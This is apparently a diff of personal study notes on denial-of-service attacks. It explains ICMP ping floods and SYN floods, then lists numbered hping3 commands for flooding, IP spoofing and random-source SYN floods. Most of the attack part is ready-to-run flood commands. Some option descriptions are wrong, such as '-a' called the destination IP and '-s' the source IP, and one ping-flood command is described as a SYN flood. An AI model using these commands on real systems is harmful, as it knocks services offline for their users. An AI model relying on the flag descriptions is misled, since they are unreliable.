@@ -1,6 +1,51 @@
-Denial of Service Attack:
+DENIAL OF SERVICE(DOS) ATTACK:
     A denial of service (DoS) event is a cyber attack in which hackers or
     cybercriminals seek to make a host machine, online service or network resource
     unavailable to its intended users.
     Different types of Denial of Service Attacks: Syn flood, Ping (ICMP) flood, UDP flood, etc.
+    
+    Ping Flood DOS attack:
+        An Internet Control Message Protocol (ICMP) flood attack, also known as a Pingflood attack, 
+        is a common Denial-of-Service (DoS) attack in which an attacker attempts to overwhelm a targeted device with ICMP echo-requests (pings).
+        Normally, ICMP echo-request and echo-reply messages are used to ping a network device in order to diagnose the health and 
+        connectivity of the device and the connection between the sender and the device. 
+        By flooding the target with request packets, the network is forced to respond with an equal number of reply packets. 
+        This causes the target to become inaccessible to normal traffic.
+        
+    Syn Flood DOS attack:
+        A connection should be established b4 sending packets. TCP 3 way handshake....syn, syn-ack & ack.
+        
     Hping3 for performing DOS attack
+        -c:count of packets
+        -s: sourch ip
+        -a: dest ip on which attack will happen
+        -i: interval b/tw each ping(in secs)
+        -1: One(icmp packet)
+        -S: Syn packet
+        -d: data size
+        -w: set tcp window
+   Commands:
+   PING FLOOD DOS ATTACK(icmp)
+    1.hping3 -s 10.5.7.21 -a 10.9.7.6 -p 135 --flood
+    from src to dest on port 135 syn flood is done.
+    2.hping3 -1 -c 3 192.168.23.2 
+    sends 3 packets...send n revcies reply
+    3.hping3 -1 -c 6 -i 5 192.168.217.3
+    6 packets will be transmitted after each 5 secs.
+    4.hping3 -1 --fast 192.168.0.0
+    increasing rate of speed(ping flood attack)
+    5.hping -1 --flood 192.168.0.9
+    flooding with max no of pings
+    6.hping3 -1 -a 192.168.217.2 -c 1 192.168.217.3
+    send icmp packet but from fake ip(first ip) to another ip. This is called ip spoofing. No packets r recieved.
+    7.hping3 -1 --rand-source -c 1 192.168.217.3
+    send packets from random src, we don't khow which. We can send to random destination too.
+    
+   SYN FLOOD DOS ATTACK(tcp)
+    1.hping3 -S -c 1 -p 80 192.168.217.2
+    transmit 1 syn packet is being sent to port 80 of this ip.
+    2.hping3 -S --flood -p 80 192.16.217.3
+    flooding syn packets
+    3.hping3 -c 15000 -d 120 -S -w 64 -p 80 --flood --rand-source 192.168.1.159
+    flooding ip frm random source with 15000 packets of data size 120 with tcp window set on port 80
+    
